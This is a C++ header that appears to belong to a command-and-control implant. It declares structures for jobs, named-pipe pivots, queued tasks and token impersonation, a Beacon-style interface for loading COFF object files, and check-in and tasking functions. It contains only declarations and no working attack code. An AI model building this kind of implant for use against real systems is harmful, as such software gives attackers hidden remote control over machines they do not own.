#pragma once

#include "Ntdll.h"
#include <nlohmann/json.hpp>
#include <string>

#include "Channel.h"

#pragma comment( lib, "ntdll.lib" )

using json   = nlohmann::json;
using string = std::string;

#define MAX_TASK_EXECUTE_COUNT 5
#define MAX_TASK_SEND_COUNT 5

#define JOB_TYPE_THREAD 0x00000000
#define JOB_TYPE_PROCESS 0x00000001

extern "C" {
_Ret_range_( <=, MAXLONG ) NTSYSAPI ULONG NTAPI RtlRandomEx( _Inout_ PULONG Seed );
}

inline ULONG RandomUint32() {
    ULONG seed = GetTickCount();
    return RtlRandomEx( &seed );
}

typedef struct {
    LIST_ENTRY ListEntry;
    DWORD      ID;
    HANDLE     hProcess;
    HANDLE     hThread;
    HANDLE     hAnonPipe;
    DWORD      Type;
    DWORD      Status;
} JOB, *PJOB;

typedef struct {
    LIST_ENTRY ListEntry;
    DWORD      ImplantID;
    HANDLE     PipeHandle;
} PIVOT_INFO;

typedef struct {
    LIST_ENTRY ListEntry;

    json  Data;
    DWORD Status;
} TASK_INFO, *PTASK_INFO;

#include "Coff.h"

// IImplant interface
//
typedef struct {
    DWORD SessionID; // Implant session id

    void ( *BeaconDataParse )( datap* parser, char* buffer, int size );
    int ( *BeaconDataInt )( datap* parser );
    short ( *BeaconDataShort )( datap* parser );
    int ( *BeaconDataLength )( datap* parser );
    char* ( *BeaconDataExtract )( datap* parser, int* size );

} IImplant;

typedef struct {
    DWORD SessionID; // Implant session id

    BOOL       IsImpersonating;
    LIST_ENTRY JobList;          // List of executing jobs
    LIST_ENTRY TaskRequestList;  // List of wating tasks
    LIST_ENTRY TaskResponseList; // List of finished tasks
    IImplant   Interface;
} IMPLANT, *PIMPLANT;

BOOL ImplantInitialize( VOID );
VOID ImplantRegister( VOID );
BOOL ImplantExecute( DWORD Count );
VOID ImplantLoop( VOID );

BOOL ImplantSendCheckin( json& task, json& response );
BOOL ImplantSendTasks( DWORD Count );
BOOL ImplantQueueTaskRequest( json TaskRequest );
BOOL ImplantQueueTaskResult( json TaskResult );

BOOL ImplantGetJobsInfo();

extern IMPLANT g_Implant;
